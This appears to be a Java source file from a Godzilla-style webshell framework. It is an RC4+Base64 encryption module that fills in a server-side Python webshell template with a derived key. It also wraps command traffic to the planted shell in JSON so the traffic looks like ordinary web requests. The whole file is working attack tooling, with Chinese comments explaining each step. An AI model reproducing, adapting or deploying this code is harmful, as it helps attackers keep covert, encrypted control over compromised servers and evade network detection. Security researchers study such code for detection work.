package shells.cryptions.python;


import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;

import util.Log;
import util.RC4;
import util.functions;
import util.http.Http;

import java.io.InputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// 加密器，负责生成Python_BASE64 的payload
@CryptionAnnotation(Name = "Python_RC4_BASE64", payloadName = "PythonDynamicPayload")
public class PythonRC4Base64 implements Cryption {
    private ShellEntity shell;
    private Http http;
    private RC4 decodeCipher;
    private RC4 encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String pass;
    private Pattern pattern = Pattern.compile("\"data\"\\s*:\\s*\"([^\"]+)\"");

    /**
     * 初始化加密器
     * @param context Shell 实体对象，包含连接配置和密钥信息
     * 功能说明：
     * 1. 保存 Shell 实体和 HTTP 连接对象
     * 2. 获取密钥（secretKeyX）和密码
     * 3. 设置 HTTP 请求头为 JSON 格式
     * 4. 初始化 RC4 加密和解密对象（使用相同密钥）
     * 5. 获取载荷（payload）并发送到目标服务器
     * 6. 设置初始化状态
     */
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        this.shell.getHeaders().put("Content-Type", "application/json");
        try {
            this.encodeCipher = new RC4(this.key);
            this.decodeCipher = new RC4(this.key);
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception e) {
            Log.error(e);
        }
    }

    /**
     * 加密数据
     * @param data 待加密的原始字节数据
     * @return 加密后的 JSON 格式字节数组，格式为 {"data":"base64编码的密文"}，失败返回 null
     * 功能说明：
     * 1. 使用 RC4 加密原始数据
     * 2. 将加密结果进行 Base64 编码
     * 3. 封装为 JSON 格式
     * 4. 使用 synchronized 保证线程安全（RC4 状态会随加密过程变化）
     */
    public byte[] encode(byte[] data) {
        try {
            synchronized (this.encodeCipher) {
                return String.format("{\"data\":\"%s\"}", functions.base64EncodeToString(encodeCipher.crypt(data))).getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    /**
     * 解密数据
     * @param bytes 从服务器接收到的 JSON 格式加密数据
     * @return 解密后的原始字节数据，失败返回空数组
     * 功能说明：
     * 1. 从 JSON 响应中提取 "data" 字段的值（使用正则表达式匹配）
     * 2. 对提取的 Base64 字符串进行解码
     * 3. 使用 RC4 解密数据
     * 4. 使用 synchronized 保证线程安全（RC4 状态会随解密过程变化）
     */
    public byte[] decode(byte[] bytes) {
        String text = new String(bytes);
        Matcher matcher = pattern.matcher(text);

        if (matcher.find()) {
            String dataStr = matcher.group(1);
            byte[] data = functions.base64Decode(dataStr);
            synchronized (this.decodeCipher) {
                return decodeCipher.crypt(data);
            }
        }
        return new byte[0];
    }

    /**
     * 检查是否需要发送 RL 数据
     * @return 始终返回 false，表示不需要发送 RL 数据
     * 功能说明：RL 数据是 Godzilla 框架中的一种特殊数据格式，此加密器不使用该格式
     */
    public boolean isSendRLData() {
        return false;
    }

    /**
     * 检查加密器初始化状态
     * @return true 表示初始化成功，false 表示初始化失败
     * 功能说明：用于验证加密器是否正确初始化，特别是在 init() 方法中 payload 是否成功加载
     */
    public boolean check() {
        return this.state;
    }

    /**
     * 生成服务端加密脚本
     * @param password 连接密码（未使用）
     * @param secretKey 密钥，用于生成 RC4 密钥和载荷名称
     * @return 生成的服务端 JavaScript 代码字节数组
     * 功能说明：
     * 1. 计算 secretKey 的 MD5 值，取前 16 位作为 RC4 密钥
     * 2. 读取 rc4-json.js 模板文件
     * 3. 替换模板中的占位符：
     *    - {secretKey} 替换为实际的 RC4 密钥
     *    - {payloadName} 替换为载荷对象名称（格式：g + md5(secretKey)[3:8]）
     * 4. 返回生成的 JavaScript 代码
     */
    public byte[] generate(String password, String secretKey) {
        String key = functions.md5(secretKey).substring(0, 16);
        InputStream fileInputStream = PythonRC4Base64.class.getResourceAsStream("assets/rc4-json.py");
        String template = new String(functions.readInputStreamAutoClose(fileInputStream));
        String code = template.replace("{secretKey}", key).replace("{payloadName}", String.format("g%s", functions.md5(secretKey).substring(3, 8)));
        return code.getBytes();
    }
}

